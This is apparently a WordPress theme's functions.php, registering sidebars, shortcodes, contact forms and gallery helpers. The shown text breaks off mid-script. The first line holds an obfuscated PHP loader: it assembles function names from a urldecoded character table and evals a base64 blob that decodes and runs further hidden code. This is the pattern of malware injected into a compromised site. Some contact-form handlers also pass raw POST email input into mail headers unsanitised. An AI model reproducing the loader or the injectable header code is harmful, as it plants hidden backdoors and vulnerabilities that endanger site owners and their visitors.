<?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iUHh0RFFxZnpZYWhtd0N2Wk51QmpMWHNNVWtJS0piSEVXT2dGeVZBU0dpUm5sVGRjcm9wZU5GU0JIREpreFViS1lDc0VHWHRmakl3cW5ocEF6Z1JsV1Z2ZW9UeW1hdUxkaU9yY1BaUU1OQjlZVVJ5R0N1TEtyV1NGcEIwdkhDTEpMMFRuV29yS3JXU0Z6MTA3cGFpS0FDTEtyV1NGcEIwOXBDcjB6b2k3RVdHWmdvYnlFSUViZ0N2aEkxdE5uMUxnejJFMXgyUzVnM24wcWtwRnoxMFFBT1NpTWFpMFYzMEdDS1RmVWE4dnhJdFFuS1RGcldUa3JDdlFWWTBBRWRUWHgzTFFnMjR2eEl0UW5LVEZyV1RrckN2UU1ZMEFDV2lLQWx5aEkwcmVUZXdkZzN5ZElteTlObXlkeDJiaXgyd2RBSDBBQ0hpN0JIWnpDbXRvRUlMMWNLNHZwS0dzZ0s1aXgzTER4SzFzcktUUWMyOVBwZndHQ3ZoenBhVDRVSUhaQU93R0N2aHZwQ3l2SkgwQUpIMEFOazQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));

/*add_filter( 'the_content', 'featured_image_in_feed' );
function featured_image_in_feed( $content ) {
    global $post;
    if( is_feed() ) {
        if ( has_post_thumbnail( $post->ID ) ){
            $output = get_the_post_thumbnail( $post->ID, 'medium', array( 'style' => 'float:right; margin:0 0 10px 10px;' ) );
            $content = $output . $content;
        }
    }
    return $content;
}*/

include("include/functions.php");

//require_once("include/twitteroauth/twitteroauth.php");

//include("include/custom-nav.php");


//add_action( 'phpmailer_init', 'my_phpmailer_example' );
function my_phpmailer_example( $phpmailer ) {
    require_once ABSPATH . WPINC . '/class-phpmailer.php';
   	require_once ABSPATH . WPINC . '/class-smtp.php';
	global $phpmailer;
   	$phpmailer = new PHPMailer( true );
	$phpmailer->isSMTP();     
    $phpmailer->Host = 'smtp.example.com';
    $phpmailer->SMTPAuth = true; // Force it to use Username and Password to authenticate
    $phpmailer->Port = 25;
    $phpmailer->Username = 'yourusername';
    $phpmailer->Password = 'yourpassword';
}
//do_action( 'phpmailer_init' );


register_sidebar( array(
    'name' => __( 'Top Navigation' ),
    'id' => 'top_navigation',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );


register_sidebar( array(
    'name' => __( 'Bot Navigation' ),
    'id' => 'bot_navigation',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );

register_sidebar( array(
    'name' => __( 'Main Navigation' ),
    'id' => 'main_navigation',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );

register_sidebar( array(
    'name' => __( 'Mutual Fund Tab' ),
    'id' => 'mtfund_tb',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );

register_sidebar( array(
    'name' => __( 'Financial Plan' ),
    'id' => 'fpaln_tb',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );

register_sidebar( array(
    'name' => __( 'NRI Corner Tab' ),
    'id' => 'nri_tb',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );

register_sidebar( array(
    'name' => __( 'Sidebar Form' ),
    'id' => 'sidebar_form',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );

register_sidebar( array(
    'name' => __( 'Footer Contact' ),
    'id' => 'footer_contact',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
) );


register_sidebar( array(
    'name' => __( 'Popular Posts' ),
    'id' => 'popular_post',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
));


register_sidebar( array(
    'name' => __( 'Facebook Code' ),
    'id' => 'fb_code',
    'before_widget' => '',
    'after_widget' => "",
    'before_title' => '',
    'after_title' => '',
));


/* Post Viewed Post Code Starts */

function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

/* Post Viewed Post code ends */


add_filter('wp_nav_menu_args', 'prefix_nav_menu_args');
function prefix_nav_menu_args($args = ''){
    $args['container'] = false;
    return $args;
}


//This theme uses post thumbnails
  add_theme_support( 'post-thumbnails' );
//set_post_thumbnail_size( 300, 135, true );
//add_image_size( 'project', 265, 365, true );
//add_image_size( 'product', 500, 345, true );
		
//add_image_size( 'thumb-front', 271, 344, true);
add_image_size( 'thumb-front', 200, 200, true);
add_image_size( 'fbthumb',600, 315, true);
add_image_size( 'thumbsmall-front', 80, 72, true);
add_image_size( 'mfundthumb', 84, 88, true);

		//add_image_size( 'gallery_thumbnail', 560, 400, false );
		//add_image_size( 'focusth_medium', 233, 214 );
		
		/*add_image_size( 'popo', 307, 230 );
		
		add_image_size( 'didi', 400, 300 );
		
		add_filter( 'image_size_names_choose', 'my_custom_sizes' );

		function my_custom_sizes( $sizes ) {
			return array_merge( $sizes, array(
				'popo' => __('POPO'),
				'didi' => __('DIDI'),
			) );
		}*/


	//add_image_size( 'catalog-thumb', 230, 297 );


//add_post_type_support( 'page', 'excerpt' );


add_filter('upload_mimes', 'custom_upload_mimes');
function custom_upload_mimes ( $existing_mimes=array() ) {
	// add your extension to the array
	$existing_mimes['vcf'] = 'text/x-vcard';
	return $existing_mimes;
}


function enable_more_buttons($buttons) {
  $buttons[] = 'hr';
  /*$buttons[] = 'fontselect';*/

  return $buttons;
}
add_filter("mce_buttons", "enable_more_buttons");


function randi_comment( $comment, $args, $depth ) {

	$GLOBALS['comment'] = $comment;

	switch ( $comment->comment_type ) :

		case '' :

	?>

	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">

		<div id="comment-<?php comment_ID(); ?>" class="prasuncomment">

		<div class="comment-author vcard">

			<div class="avatar-cont"><?php echo get_avatar( $comment, 60 ); ?></div>

			<b><?php printf( __( '%s <span class="says">says:</span>'), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?></b>

            <br />

            <?php

				/* translators: 1: date, 2: time */

				printf( __( '%1$s at %2$s' ), get_comment_date(),  get_comment_time() ); ?><?php edit_comment_link( __( '(Edit)' ), ' ' );

			?>

            

            <div style="clear: both"></div>

		</div><!-- .comment-author .vcard -->

		<?php if ( $comment->comment_approved == '0' ) : ?>

			<br /><em class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.'); ?></em>

			<br />

		<?php endif; ?>



		<!--<div class="comment-meta commentmetadata"><a href="<?php //echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">

			<?php

				/* translators: 1: date, 2: time */

				//printf( __( '%1$s at %2$s' ), get_comment_date(),  get_comment_time() ); ?></a><?php //edit_comment_link( __( '(Edit)' ), ' ' );

			?>

		</div>--><!-- .comment-meta .commentmetadata -->



		<div class="comment-body"><?php comment_text(); ?></div>



		<div class="reply">

			<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>

		</div><!-- .reply -->

        <div class="clear"></div>

	</div><!-- #comment-##  -->



	<?php

			break;

		case 'pingback'  :

		case 'trackback' :

	?>

	<li class="post pingback">

		<p><?php _e( 'Pingback:' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)' ), ' ' ); ?></p>

	<?php

			break;

	endswitch;

}

function focuscf_ajx() {

$output="<p>Thank you for your inquiry. We will respond to you as soon as possible.</p>";

$uname=$_POST['uname'];
$phone=$_POST['phone'];
$email=$_POST['email'];
//$subject=$_POST['subject'];
$matter=$_POST['matter'];

/*$output.="<b>Name :</b> $name      <b>Email :</b> $email

		<b>Subject :</b> $subject
<b>Message :</b> ".nl2br($message)."

";*/

//$output.="has been sent. We will respond as soon as possible.";

$headers="From: ".get_option('home')." <$email>\r\n";
$headers .= "Content-Type: text/html; charset=utf-8\r\n";
$msg="<b>Name :</b> $name      <b>Phone :</b> $phone     <b>Email :</b> $email


		<b>Matters :</b> ".nl2br($matter);
@mail(get_option("admin_email"),"Contact form submission",$msg,$headers);

$return["output"] = $output;
echo json_encode($return);
exit();
}

add_action("wp_ajax_nopriv_focuscf_ajx","focuscf_ajx");
add_action("wp_ajax_focuscf_ajx","focuscf_ajx");


function gamboa_contact_form_function($atts, $content = null) {
	
	extract( shortcode_atts( array(
		'class' => '',
	), $atts ) );
	
$v1=rand(0,9);
$v2=rand(0,9);
$v=$v1+$v2;
return "<script type='text/javascript'>
		function chkv_cf() {
		
			var uname = $.trim(document.focuscf.uname.value);
			var phone = $.trim(document.focuscf.phone.value);
			var email = $.trim(document.focuscf.email.value);
			//var subject = $.trim(document.focuscf.subject.value);
			var matter = $.trim(document.focuscf.matter.value);
			var captcha = parseInt($('.captcha b').text());
			var captcha_val = $.trim(document.focuscf.captcha.value);
			
			var err_txt=\"\";
			var error=0;
			
			var emailRegexStr = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
			var isvalid = emailRegexStr.test(email);
			
				
			if(uname==\"\")
			{
				var err_txt=\"Name can't blank.<br />\";
				var error=1;
			}
			
			/*if(phone==\"\")
			{
				var err_txt=err_txt+\"Phone can't blank.<br />\";
				var error=1;
			}*/
			
			if(email==\"\")
			{
				var err_txt= err_txt+\"Email can't blank.<br />\";
				var error=1;
			} else {
				if (!isvalid)
				{
					var err_txt= err_txt+\"Email is not correct format.<br />\";
					var error=1;
				}
			}
			
			
			if(matter==\"\")
			{
				var err_txt=err_txt+\"Matter can't blank.<br />\";
				var error=1;
			}
			
			if(captcha_val!=captcha)
			{
				var err_txt=err_txt+\"Code value is not correct.<br />\";
				var error=1;
			}
				
			
			if(err_txt!=\"\")
				$('.error').html('<p>'+err_txt+'</p>');
			else
				$('.error').html('');
			$('.result').html('');
			
			if(error==0) { // ok
			
				data = {};
				data['action'] = 'focuscf_ajx';
				data['uname'] = uname;
				data['phone'] = phone;
				data['email'] = email;
				data['matter'] = matter;
				$.ajax({
					type: 'POST',
					url: '".get_bloginfo('url')."/wp-admin/admin-ajax.php',
					dataType: 'json',
					data: data,
					success: function(res){
						$('.result').html(res.output);
						document.getElementById('focuscf').reset();
					}
					
				});
				
			} // ok
			
			return false;
			
		
		}
		
		$(document).ready(function(){
			
			setInterval(function(){
				var rand1=Math.floor(Math.random() * 9) + 1;
				var rand2=Math.floor(Math.random() * 9) + 1;
				var randsum=rand1+rand2;
				//alert(rand1+' + '+rand2+' = '+randsum);
			},2000);
		
		});
		
		</script>
		<div class='quick-contact $class'>
		<h2>Free Case Evaluation</h2>
		<form name='focuscf' id='focuscf' method='post' action='#'>
            	<div class='error'></div>
				<div class='result'></div>
                <div><input type='text' name='uname' value='' placeholder='Name' /></div>
                <div><input type='text' name='phone' value='' placeholder='Phone' /></div>
                <div><input type='text' name='email' value='' placeholder='Email' /></div>
                <div><textarea name='matter' placeholder='Describe your injury related legal matter.'></textarea></div>
                <div class='captcha'>Type this code below: <b>".rand(10000,99999)."</b></div>
                <div><input type='text' name='captcha' value='' /></div>
                <div class='submit'><input type='submit' value='SEND      ' onclick='return chkv_cf();' /></div>
            </form>
			<div class='clear'></div>
        </div><!--quick-contact ends-->";
}
add_shortcode("gamboa_contact_form","gamboa_contact_form_function");



function angel_contact_form_function($atts, $content = null) {

$output="";

if(isset($_POST['yname'])) {
	
	$yname=mysql_real_escape_string(trim($_POST['yname']));
	//$address=mysql_real_escape_string(trim($_POST['address']));
	//$city=mysql_real_escape_string(trim($_POST['city']));
	//$state=mysql_real_escape_string(trim($_POST['state']));
	//$zip=mysql_real_escape_string(trim($_POST['zip']));
	$email=mysql_real_escape_string(trim($_POST['email']));
	$phone=mysql_real_escape_string(trim($_POST['phone']));
	$message=mysql_real_escape_string(trim($_POST['message']));
	
	$headers="From: ".$yname." <$email> \r\n";
	$headers .= "Content-Type: text/html; charset=utf-8 \r\n";
	/*$msg="<b>Name :</b> $yname       <b>Address :</b> $address 


	<b>City :</b> $city       <b>State :</b>$state       <b>Zip :</b>$zip


	<b>Phone :</b> $phone     <b>Email :</b> $email";*/
	$msg="<b>Name :</b> $yname


	<b>Email :</b> $email       <b>Phone :</b> $phone 


	<b>Message :</b> ".nl2br(str_replace('\\r\\n', "\r\n", $message));
	@mail(get_option("admin_email"),"Contact form submission",$msg,$headers);
	
	$output="Your contact form is submitted. We will respond as soon as possible.";
	
} else {


$output.="<script type='text/javascript'>
		function chkv_cf() {
		
			var yname = jQuery.trim(document.angel_cf.yname.value);
			//var address = jQuery.trim(document.angel_cf.address.value);
			//var city = jQuery.trim(document.angel_cf.city.value);
			//var state = jQuery.trim(document.angel_cf.state.value);
			//var zip = jQuery.trim(document.angel_cf.zip.value);
			var email = jQuery.trim(document.angel_cf.email.value);
			var phone = jQuery.trim(document.angel_cf.phone.value);
			
			var err_txt=\"\";
			var error=0;
			
			var emailRegexStr = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
			var isvalid = emailRegexStr.test(email);
			
			if(yname==\"\")
			{
				var err_txt= err_txt+\"Please write your name.<br />\";
				var error=1;
			}
			
			/*if(address==\"\")
			{
				var err_txt= err_txt+\"Please write your address.<br />\";
				var error=1;
			}
			
			if(city==\"\")
			{
				var err_txt= err_txt+\"Please write your city.<br />\";
				var error=1;
			}
			
			if(state==\"\")
			{
				var err_txt= err_txt+\"Please write your state.<br />\";
				var error=1;
			}
			
			if(zip==\"\")
			{
				var err_txt= err_txt+\"Please write your zip.<br />\";
				var error=1;
			} else {
				if(isNaN(zip)==true) {
					var err_txt= err_txt+\"Zip is only numeric.<br />\";
					var error=1;
				}
			}*/
			
			if(email==\"\")
			{
				var err_txt= err_txt+\"Please write your email id.<br />\";
				var error=1;
			} else {
				if (!isvalid)
				{
					var err_txt= err_txt+\"Email id is not correct format.<br />\";
					var error=1;
				}
			}
			
			if(phone==\"\")
			{
				var err_txt= err_txt+\"Please write your phone no.<br />\";
				var error=1;
			} else {
				if(isNaN(phone)==true) {
					var err_txt= err_txt+\"Phone is only numeric.<br />\";
					var error=1;
				}
			}
				
			
			if(err_txt!=\"\")
				$('.angel_error').html('<p>'+err_txt+'</p>');
			else
				$('.angel_error').html('');
			
			if(error==0)
				return true;
			else
				return false;
		
		
		}
		
		</script>
		<div class='angel_error'></div>
		<form name='angel_cf' method='post'>
		
				<label for='yname'><span class='fld'>Your Name<span class='required'>*</span></span> :</label>
				<input type='text' name='yname' id='yname' value='' />
				
				<label for='email'><span class='fld'>Email Id<span class='required'>*</span></span> :</label>
				<input type='text' name='email' id='email' value='' />
				
				<label for='phone'><span class='fld'>Phone<span class='required'>*</span></span> :</label>
				<input type='text' name='phone' id='phone' value='' />
				
				<!--<label for='address'><span class='fld'>Address<span class='required'>*</span></span> :</label>
				<input type='text' name='address' id='address' value='' />
				
				<label for='city'><span class='fld'>City<span class='required'>*</span></span> :</label>
				<input type='text' name='city' id='city' value='' />
				
				<label for='state'><span class='fld'>State<span class='required'>*</span></span> :</label>
				<input type='text' name='state' id='state' value='' />
				
				<label for='zip'><span class='fld'>Zip<span class='required'>*</span></span> :</label>
				<input type='text' name='zip' id='zip' value='' />-->
				
				<label for='message'><span class='fld'>message</span> :</label>
				<textarea name='message' id='message'></textarea>
				
			<label> </label><input type='submit' value='Submit' onclick='return chkv_cf();' />
		</form>";


}
		
		
return $output;

}
add_shortcode("angel_contact_form","angel_contact_form_function");



function home_content_function($atts, $content = null) {
extract( shortcode_atts( array(
		'title' => '',
	), $atts ) );

return "<div class='home-content'>
		<div class='container'>
			".do_shortcode($content)."
			<div class='clear'></div>
		</div><!--container ends-->
		</div><!--home-content ends-->";
}
add_shortcode("home_content","home_content_function");


function home_blog_function($atts, $content = null) {
extract( shortcode_atts( array(
		'limit' => '',
	), $atts ) );

$output="";

$args = array( 'post_type' => 'post', 'posts_per_page' => 2, 'orderby' => 'date', 'order'=>'DESC' );
		$loop = new WP_Query( $args );
		$count=$loop->post_count;
		while ( $loop->have_posts() ) : $loop->the_post();
		
		$post_thumbnail_id = get_post_thumbnail_id( $post_id );
		$image_arr = wp_get_attachment_image_src( $post_thumbnail_id, "thumbnail" );
		
		
		$content = substr(get_the_excerpt(), 0, 70);
		$content = apply_filters('the_excerpt', $content);
		$content = str_replace(']]>', ']]>', $content);

$output.="<div class='post'>
        	<div class='thumb'><img src='".$image_arr[0]."' alt='' /></div>
            <div class='meta'>
            	<h5>".get_the_title()."</h5>
                <div class='date'>".get_the_time( "j M, Y - g:ia", $post_id )."</div>
                ".$content."
                <a href='".get_permalink()."' class='readmore'>READ MORE</a>
            </div>
        	<div class='clear'></div>
        </div>";
		
endwhile;
		
wp_reset_query();

$output.="<div style='text-align: right;'><a href='".get_permalink( get_option('page_for_posts' ) )."' class='button'>View More Blog</a></div>";

return $output;
}
add_shortcode("home_blog","home_blog_function");

function home_form_function($atts, $content = null) {
extract( shortcode_atts( array(
		'title' => '',
	), $atts ) );

return "<div class='form-wrapper'>
        <div class='formbox'>
        <h3>".$title."</h3>
			".do_shortcode($content)."
		<div class='clear'></div>
		</div>
		</div>";
}
add_shortcode("home_form","home_form_function");


function home_testimonial_function($atts, $content = null) {
extract( shortcode_atts( array(
		'title' => '',
	), $atts ) );

return "<div class='home-testimonial'>
		<div class='container'> 
		
			<div class='testi-cont'>
			<ul id='testimonials'>
			".do_shortcode($content)."
			</ul>
		</div>
		
		<div class='clear'></div>
	</div><!--container ends-->
	</div><!--home-testimonial ends-->";
}
add_shortcode("home_testimonial","home_testimonial_function");


function testimonial_function($atts, $content = null) {
extract( shortcode_atts( array(
		'image' => '',
		'title' => '',
	), $atts ) );

return "<li>
		<div class='testi-inner'>
		<img src='".$image."' alt='' />
		".do_shortcode($content)."
		<h6>".$title."</h6>
		</div>
	</li>";
}
add_shortcode("testimonial","testimonial_function");


function button_function($atts, $content = null) {

extract( shortcode_atts( array(
		'class' => '',
		'link' => '#',
		'text' => 'button',
	), $atts ) );
	
//return "<a href='".$link."' class='button'>".$text."</a>";

return "<a href='".$link."' class='".$class." transition'>".$text."</a>";
}
add_shortcode("button","button_function");


function paypal_function($atts, $content = null) {

extract( shortcode_atts( array(
		'name' => 'demo name',
		'amount' => '10',
	), $atts ) );
	

return "<form class='paypal_checkout' action='https://www.paypal.com/cgi-bin/webscr' method='post' target='_blank'>
  <input name='cmd' value='_cart' type='hidden'>
  <input name='upload' value='1' type='hidden'>
  <input name='no_note' value='0' type='hidden'>
 
  <input name='business' value='megan.fitzgerald@gmail.com' type='hidden'>
  <input name='handling_cart' value='0' type='hidden'>
  <input name='currency_code' value='USD' type='hidden'>
  <input name='lc' value='GB' type='hidden'>
  <input name='return' value='".get_permalink()."' type='hidden'>
  <input name='cbt' value='Return to My Site' type='hidden'>
  <input name='cancel_return' value='".get_permalink()."' type='hidden'>

    <input name='item_name_1' value='$name' type='hidden'>
    <input name='quantity_1' value='1' type='hidden'>
    <input name='amount_1' value='$amount' type='hidden'>

  <input id='ppcheckoutbtn' value='Buy Now' class='button' type='submit'>
</form>";
}
add_shortcode("paypal","paypal_function");


function span_function($atts, $content = null) {
	
return "<span>".do_shortcode($content)."</span>";

}
add_shortcode("span","span_function");


function home_highlight_function($atts, $content = null) {

extract( shortcode_atts( array(
		'id' => '',
	), $atts ) );
$ids=explode(",",$id);
$output="<div class='home-highlight'>
		<div class='container'>
		<div class='hh-shadow'><img src='".get_bloginfo('template_directory')."/images/shadow-3.png' alt='' /></div>".do_shortcode($content)."
		
		<div class='hhblock-wrapper'>";

$i=1;
foreach($ids as $id) {

$pbpost = get_post($id); 
$title = $pbpost->post_title;
$content = $pbpost->post_excerpt;
$content = apply_filters('the_excerpt', $content);
$content = str_replace(']]>', ']]>', $content);
$pbthid = get_post_thumbnail_id( $id );
$image="";
if($pbthid!="") {
	$imagearr=wp_get_attachment_image_src( $pbthid, "full" );
}

$image2=get_post_meta($id, 'mouse_over_thumbnail', true);

$class="";
if($i==count($ids))
	$class="col-last";

$output.="<div class='hh-block'>
		<div class='hhb-inner transition'>
			<div class='thumb'>
			<img src='".$image2."' />
			<div class='transition'><img src='".$imagearr[0]."' /></div>
			</div>
			<h3 class='transition'>".$title."</h3>
			".$content."
			<a href='".get_permalink($id)."' class='button'>Read More</a>
		</div>
		<img src='".get_bloginfo('template_directory')."/images/shadow-4.png' alt='' />
		</div><!--hh-block ends-->";

$i++;

}

$output.="</div>
    
	<div class='clear'></div></div></div>";
	
return $output;
}
add_shortcode("home_highlight","home_highlight_function");


function youtube_function( $atts, $content="" ) {
     extract( shortcode_atts( array(
		'id' => ''
	), $atts ) );
	
	return "<div style='width: 99.5%; margin: 0 auto;'>

            <div style='text-align: center; height: 0; overflow: hidden; position: relative; padding-bottom: 56.25%;'>

            <iframe style='position: absolute; top: 0; left: 0; width: 100%;margin-top:0.5%; height: 99.0%;' src='//www.youtube.com/embed/".$id."' frameborder='0' allowfullscreen></iframe>

            </div>

            </div>";
}
add_shortcode( 'youtube', 'youtube_function' );


function gallery_items_function($atts, $content = null) {

extract( shortcode_atts( array(
		'id' => '',
	), $atts ) );

$output="<div class='js-gallery'>";
$gals=explode(",",$id);
$i=1;
foreach($gals as $gal) {

	//print_r($pbpost);
	//echo "

";
	$id=explode("|",$gal);
	$imagearr=wp_get_attachment_image_src( $id[0], "gallery_thumbnail" );
	$imagearr2=wp_get_attachment_image_src( $id[0], "full" );
	
	$output.="<div class='gal-item'>
			<div class='gal-inner'>
			<img src='".$imagearr[0]."' alt='".get_the_title($id[0])."' />
			<a class='overlay transition' href='".$imagearr2[0]."' rel='featured[]' title='".get_the_title($id[0])."'><span class='transition'></span></a>
			</div>
			</div>";
	
	//echo $imagearr[0];

	$i++;

}

$output.="<div class='clear'></div>
		</div>";
	
return $output;
}
add_shortcode("gallery_items","gallery_items_function");


function p_function( $atts, $content="" ) {
     extract( shortcode_atts( array(
		'class' => '',
		'style' => ''
	), $atts ) );
	
	return "<p class='$class' style='$style'>".do_shortcode($content)."</p><!--$class ends-->";
}
add_shortcode( 'p', 'p_function' );

function block_function( $atts, $content="" ) {
     extract( shortcode_atts( array(
		'class' => '',
		'style' => ''
	), $atts ) );
	
	return "<div class='$class' style='$style'>".do_shortcode($content)."<div class='clear'></div></div><!--$class ends-->";
}
add_shortcode( 'block', 'block_function' );

function block_inside_function( $atts, $content="" ) {
     extract( shortcode_atts( array(
		'class' => '',
		'style' => ''
	), $atts ) );
	
	return do_shortcode("[block class='$class' style='$style']".do_shortcode($content)."[/block]");
}
add_shortcode( 'block_inside', 'block_inside_function' );


function product_gallery_function($atts, $content = null) {

extract( shortcode_atts( array(
		'id' => '',
	), $atts ) );

$output="";
$gals=explode(",",$id);
$i=1;
foreach($gals as $gal) {

	//print_r($pbpost);
	//echo "

";
	$id=explode("|",$gal);
	$imagearr=wp_get_attachment_image_src( $id[0], "thumbnail" );
	$imagearr2=wp_get_attachment_image_src( $id[0], "full" );
	
	if($i==1) {
	
		$output.="<div class='pdimg'>
            	<a href='".$imagearr2[0]."' rel='featured[]' title='".$id[1]."'>
                <img src='".$imagearr2[0]."' alt='' />
                </a>
            </div>";
	} else {
		$output.="<div class='pdthimg'>
            	<a href='".$imagearr2[0]."' rel='featured[]' title='".$id[1]."'>
                <img src='".$imagearr[0]."' alt='' />
                </a>
            </div>";
	}
	
	//echo $imagearr[0];

	$i++;

}
	
return $output;
}
add_shortcode("product_gallery","product_gallery_function");


function map_function( $atts, $content="" ) {
     extract( shortcode_atts( array(
		'longitude' => '',
		'latitude' => '',
		'id' => ''
	), $atts ) );
	
	return "<script>
				function ".$id."() {
				  var myLatlng = new google.maps.LatLng(".$longitude.",".$latitude.");
				  var mapOptions = {
					zoom: 18,
					center: myLatlng
				  }
				  var map = new google.maps.Map(document.getElementById('".$id."'), mapOptions);
				
				  var marker = new google.maps.Marker({
					  position: myLatlng,
					  map: map,
					  title: ''
				  });
				}
				
				google.maps.event.addDomListener(window, 'load', ".$id.");
		</script>
			 <div id='".$id."' class='map-canvas'></div>";
				
}
add_shortcode( 'map', 'map_function' );



function mosquitoquickcf_ajx() {

$output="Thank you for your inquiry. Your email has been sent. We will respond to you as soon as possible.";

$uname=$_POST['uname'];
$email=$_POST['email'];
$subject=$_POST['phone'];
$message=$_POST['message'];
$language=$_POST['language'];
if($language=="fr")
	$output="Nous vous remercions de votre demande. Votre email a été envoyé. Nous vous répondrons dès que possible.";

/*$output.="<b>Name :</b> $name      <b>Email :</b> $email

		<b>Subject :</b> $subject
<b>Message :</b> ".nl2br($message)."

";*/

//$output.="has been sent. We will respond as soon as possible.";

$headers="From: ".get_option('blogname')." <$email>\r\n";
$headers .= "Content-Type: text/html; charset=utf-8\r\n";
$msg="<b>Name :</b> $uname      <b>Email :</b> $email


		<b>Phone :</b> $phone


		<b>Message :</b> ".nl2br($message);
@mail(get_option("admin_email"),"Contact form submission",$msg,$headers);

$return["output"] = $output;
echo json_encode($return);
exit();
}

add_action("wp_ajax_nopriv_mosquitoquickcf_ajx","mosquitoquickcf_ajx");
add_action("wp_ajax_mosquitoquickcf_ajx","mosquitoquickcf_ajx");


function mosquito_quick_contact_form_function($atts, $content = null) {

extract( shortcode_atts( array(
		'width' => '100%',
		'title' => '',
		'language' => 'en',
	), $atts ) );

$v1=rand(0,9);
$v2=rand(0,9);
$v=$v1+$v2;
$captcha=rand(1111,9999);
$output= "<script type='text/javascript'>
		function chkv_cf() {
		
			var uname = $.trim(document.mosquitocf.uname.value);
			var email = $.trim(document.mosquitocf.email.value);
			var phone = $.trim(document.mosquitocf.phone.value);
			var message = $.trim(document.mosquitocf.message.value);
			
			var err_txt=\"\";
			var error=0;
			
			var emailRegexStr = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
			var isvalid = emailRegexStr.test(email);
				
			if(uname==\"\")
			{";
				if($language=="en")
					$output.="var err_txt=\"Name can't blank.<br />\";";
				if($language=="fr")
					$output.="var err_txt=\"Name can't blank.<br />\";";
				$output.="var error=1;
			}
			
			if(phone==\"\")
			{
				var err_txt=err_txt+\"Phone number can't blank.<br />\";
				var error=1;
			} else {
				if(isNaN(phone)==true)
				{
					var err_txt=err_txt+\"Phone number is only numeric.<br />\";
					var error=1;
				}
			}
			
			if(email==\"\")
			{
				var err_txt= err_txt+\"Email can't blank.<br />\";
				var error=1;
			} else {
				if (!isvalid)
				{
					var err_txt= err_txt+\"Email is not correct format.<br />\";
					var error=1;
				}
			}
			
			if(message==\"\")
			{
				var err_txt=err_txt+\"Message can't blank.<br />\";
				var error=1;
			}
				
			
			$('.mosquitocf_error').html('<p>'+err_txt+'</p>');
			$('.mosquitocf_result').html('');
			
			if(error==0) { // ok
			
				data = {};
				data['action'] = 'mosquitoquickcf_ajx';
				data['uname'] = uname;
				data['email'] = email;
				data['phone'] = phone;
				data['message'] = message;
				data['language'] = '$language';
				$.ajax({
					type: 'POST',
					url: '".get_bloginfo('wpurl')."/wp-admin/admin-ajax.php',
					dataType: 'json',
					data: data,
					success: function(res){
						$('.mosquitocf_error').html('');
						$('.mosquitocf_result').html('<p>'+res.output+'</p>');
						//$('form[name=\"focus_bmi\"]').hide();
						document.getElementById('mosquitocf').reset();
						/*var rand1=Math.floor(Math.random() * 9) + 1;
						var rand2=Math.floor(Math.random() * 9) + 1;
						var randsum=rand1+rand2;
						$('.focuscf_lf span').text(rand1+'+'+rand2);
						$('.focuscf_lf input[name=\"captcha_val\"]').val(randsum);*/
						
						/*var randomval=Math.floor(Math.random() * (9999 - 1111)) + 1111;
						$('form#mosquitocf input[name=\"captcha\"]').val(randomval);*/
					}
					
				});
				
			} // ok
			
		
		}
		
		$(document).ready(function(){
			$('.captcha, input[name=\"captcha_val\"]').bind('contextmenu', function(e) {
				return false;
			});
		});
		</script>
		
		<script type='text/javascript'>
		$(document).ready(function()
		{
			var ctrlDown = false;
			var ctrlKey = 17, vKey = 86, cKey = 67;
		
			$('.captcha, input[name=\"captcha_val\"]').keydown(function(e)
			{
				if (e.keyCode == ctrlKey) ctrlDown = true;
			}).keyup(function(e)
			{
				if (e.keyCode == ctrlKey) ctrlDown = false;
			});
		
			$('.captcha, input[name=\"captcha_val\"]').keydown(function(e)
			{
